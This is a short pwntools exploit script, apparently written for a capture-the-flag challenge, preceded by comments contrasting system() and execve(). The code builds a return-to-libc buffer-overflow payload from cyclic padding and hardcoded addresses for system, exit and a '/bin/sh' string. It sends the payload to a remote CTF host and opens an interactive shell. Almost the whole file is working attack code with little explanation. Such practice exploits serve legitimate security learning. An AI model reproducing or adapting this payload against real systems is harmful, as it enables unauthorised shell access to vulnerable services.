#Return-to-libc

# system() and execve() work in different ways. 
# system() will always invoke the shell and this shell will execute the command as a separate process (this is why you can use wildcards and other shell facilities in the command line when using system()).
# execve() replaces the current process with the one being spawned directly (the execve() function doesn't return, except in case of failure). In fact system() implementation is supposed to use a sequence of fork(), execve() and wait() calls to perform its function.

from pwn import *
import struct

print(cyclic(100))

ip = 'ctf.adl.tw'
port = 11002

r = remote(ip, port)
payload = "aaaabaaacaaadaaaeaaafaaa"
# show_me_magic = 0x0000000000400627
payload += p64(0x0000000000400627)
# system = 0x400510
# 0x7ffff7e3fed0
payload += p64(0x7ffff7e3fed0)
# exit = 0x7ffff7e35720
payload += p64(0x7ffff7e35720)
# /bin/sh = 
# 0x400734
# payload += p64(0x400734)
# 0x600734
# payload += p64(0x600734)
# 0x7ffff7f7ccee
payload += p64(0x7ffff7f7ccee)

r.sendline(payload)
r.interactive()
